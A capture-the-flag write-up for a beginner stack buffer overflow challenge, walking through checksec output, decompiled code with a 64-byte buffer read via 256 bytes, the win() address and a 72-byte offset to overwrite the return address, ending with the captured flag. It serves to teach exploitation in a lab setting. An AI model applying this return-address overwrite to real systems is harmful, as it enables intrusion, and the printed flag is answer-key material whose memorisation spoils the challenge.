# baby-bof

![Proof](proof.png)

**Author:** `thek0der`  
**Solves:** 105

**writeup made by** `vlad`
---

## Description

This is your first pwn challenge.

We get a `challange` binary

---

## Solve

First i connected to the remote server to see what we get.

When we connect we get the following output:

```
Bine ai venit la PWN!
Spune ceva:
test
La revedere!
```

I inputed `test` when it asked for input and we got disconnected.

The next step is to analyze the binary localy we can first run checksec to check its properties.

```
[!] Could not populate PLT: Cannot allocate 1GB memory to run Unicorn Engine
[*] '/Users/vlad/Downloads/acctf/AC-CTF-Quals/pwn/baby-bof/challenge'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

This looks good the binary has no PIE and no canary the only thing we have to mindfull of is NX and the fact that it uses little endian.

Next i opened up the file in `IDA Professional 9.1` and we saw 3 intresting functions: main, vuln and win.

After decoding each one we see the following code:

### main:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setvbuf(_bss_start, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  puts("Bine ai venit la PWN!");
  vuln();
  puts("La revedere!");
  return 0;
}
```

### vuln:

```c
ssize_t vuln()
{
  _BYTE buf[64]; // [rsp+0h] [rbp-40h] BYREF

  puts("Spune ceva:");
  fflush(_bss_start);
  return read(0, buf, 0x100u);
}
```

### win:

```c
void __noreturn win()
{
  char s[136]; // [rsp+0h] [rbp-90h] BYREF
  FILE *stream; // [rsp+88h] [rbp-8h]

  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    puts("Flag missing.");
    fflush(_bss_start);
    exit(1);
  }
  if ( fgets(s, 128, stream) )
  {
    puts(s);
    fflush(_bss_start);
  }
  fclose(stream);
  exit(0);
}
```

We can clearly see that this is a classic stack buffer overflow the buffer is 64 bytes but the code reads 256 bytes.

Since the vuln function returns the flag we just need to overwrite the saved return address to the win function.

Remembering that PIE was disabled addresses are stable we can find out where the win function is using nm:

```
nm challenge | grep win

0000000000401196 T win
```

Now we need to calculate the offset to where we need to write the address to.

The stack frame layout is:
	•	64 bytes: buffer
	•	8 bytes: saved RBP
	•	Next 8 bytes: saved RIP (return address)

So after 72 bytes, we land exactly on the return address.

We have to keep in mind that the binary uses little endian but our exploit layout looks like this:

### [ 64 bytes filler ] + [ 8 bytes filler ] + [ win() address ]

I made a simple script(`solve.py`) that does this automatically and prints the flag but it can easily be done manually.

After running the script we get the following output:

```
[*] Received: Bine ai venit la PWN!
[*] Sending payload...
[*] Flag output:
 
Spune ceva:
ctf{3c1315f63d550570a690f693554647b7763c3acbc806ae846ce8d25b5f364d10}

```


### Flag: ctf{3c1315f63d550570a690f693554647b7763c3acbc806ae846ce8d25b5f364d10}